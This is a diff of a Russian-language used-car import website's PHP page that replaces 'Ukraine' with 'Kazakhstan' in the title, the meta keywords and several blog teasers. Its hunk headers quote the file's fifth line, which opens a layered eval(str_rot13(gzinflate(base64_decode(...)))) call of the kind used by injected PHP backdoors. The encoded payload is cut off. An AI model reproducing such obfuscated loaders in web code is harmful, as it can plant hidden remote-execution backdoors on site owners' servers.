@@ -6,7 +6,7 @@ eval(str_rot13(gzinflate(str_rot13(base64_decode('LUrFDsRJEvyaKNmbGbQnMzP7sjIzs7
 <html class="wide wow-animation" lang="ru">
   <head>
     <!-- Site Title-->
-    <title>Купить БУ Авто из США и Грузии в Украине ✅ Цены от от 7,000$ |  Avtoraketa</title>
+    <title>Купить БУ Авто из США и Грузии в Казахстане  ✅ Цены от от 7,000$ |  Avtoraketa</title>
     <meta charset="utf-8">
 	<meta property="og:title" content="Avtoraketa - доставка авто из США и Грузии">
     <meta property="og:site_name" content="Avtoraketa">
@@ -14,7 +14,7 @@ eval(str_rot13(gzinflate(str_rot13(base64_decode('LUrFDsRJEvyaKNmbGbQnMzP7sjIzs7
     <meta property="og:description" content="Предоставляем улуги профессионального пригона авто из США и Грузии">
     <meta property="og:image" content="/images/avtoraketa.jpg">
 	<meta name="description" content="Авторакета - это выгодная покупка авто с аукционов Америки и авторынков Грузии">
-	<meta name="keywords" content="Авторакета: Поставщик автомобилей из Америки и Грузии в Украину, с аукционов Copart, Manheim, IAAI. Автомобили в наличии, автомобильный аукцион. Самая надежная компания, работа под ключ.">
+	<meta name="keywords" content="Авторакета: Поставщик автомобилей из Америки и Грузии в Казахстан , с аукционов Copart, Manheim, IAAI. Автомобили в наличии, автомобильный аукцион. Самая надежная компания, работа под ключ.">
     <meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <script src="/cdn-cgi/apps/head/3ts2ksMwXvKRuG480KNifJ2_JNM.js"></script><link rel="icon" href="images/favicon.ico" type="image/x-icon">
@@ -308,16 +308,16 @@ src="https://www.facebook.com/tr?id=873801476872818&ev=PageView&noscript=1"
                   <div class="col-sm-10 col-md-6 post-light-wrap">
                     <article class="post-light">
                       <div class="unit flex-row">
-                        <div class="unit-left"><a href="avto-iz-gruzii.php"><img src="images/post-light-2-120x80.jpg" alt="Авто из Грузи в Украину" width="120" height="80"/></a></div>
+                        <div class="unit-left"><a href="avto-iz-gruzii.php"><img src="images/post-light-2-120x80.jpg" alt="Авто из Грузи в Казахстан " width="120" height="80"/></a></div>
                         <div class="unit-body">
-                          <p class="post-light-title"><a href="avto-iz-gruzii.php">Авто из Грузи и в Украину, плюсы и минусы.</a></p>
+                          <p class="post-light-title"><a href="avto-iz-gruzii.php">Авто из Грузи и в Казахстан , плюсы и минусы.</a></p>
                           <time class="post-light-time" datetime="2020">14 февраля, 2020 года</time>
                         </div>
                       </div>
                     </article>
                     <article class="post-light">
                       <div class="unit flex-row">
-                        <div class="unit-left"><a href="avto-iz-korea.php"><img src="images/post-light-3-120x80.jpg" alt="Авто из Кореи в Украину" width="120" height="80"/></a></div>
+                        <div class="unit-left"><a href="avto-iz-korea.php"><img src="images/post-light-3-120x80.jpg" alt="Авто из Кореи в Казахстан " width="120" height="80"/></a></div>
                         <div class="unit-body">
                           <p class="post-light-title"><a href="avto-iz-korea.php">Авто из Кореи. ГБО в подарок!</a></p>
                           <time class="post-light-time" datetime="2020">23 февраля, 2020 года</time>
@@ -328,7 +328,7 @@ src="https://www.facebook.com/tr?id=873801476872818&ev=PageView&noscript=1"
                   <div class="col-sm-10 col-md-6 post-light-wrap">
                     <article class="post-light">
                       <div class="unit flex-row">
-                        <div class="unit-left"><a href="samie-nadezhnie-avto-iz-usa.php"><img src="images/post-light-4-120x80.jpg" alt="Самые надёжные авто из США в Украине" width="120" height="80"/></a></div>
+                        <div class="unit-left"><a href="samie-nadezhnie-avto-iz-usa.php"><img src="images/post-light-4-120x80.jpg" alt="Самые надёжные авто из США в Казахстане " width="120" height="80"/></a></div>
                         <div class="unit-body">
                           <p class="post-light-title"><a href="samie-nadezhnie-avto-iz-usa.php">Самые надёжные авто из США. ТОП - 10.</a></p>
                           <time class="post-light-time" datetime="2020">4 марта, 2020 года</time>
@@ -337,7 +337,7 @@ src="https://www.facebook.com/tr?id=873801476872818&ev=PageView&noscript=1"
                     </article>
                     <article class="post-light">
                       <div class="unit flex-row">
-                        <div class="unit-left"><a href="avto-iz-usa-coronavirus.php"><img src="images/post-light-01-120x80.jpg" alt="Авто из США в Украину" width="120" height="80"/></a></div>
+                        <div class="unit-left"><a href="avto-iz-usa-coronavirus.php"><img src="images/post-light-01-120x80.jpg" alt="Авто из США в Казахстан " width="120" height="80"/></a></div>
                         <div class="unit-body">
                           <p class="post-light-title"><a href="avto-iz-usa-coronavirus.php">Авто из США и короновирус: что делать?</a></p>
                           <time class="post-light-time" datetime="2020">24 марта, 2020 года</time>
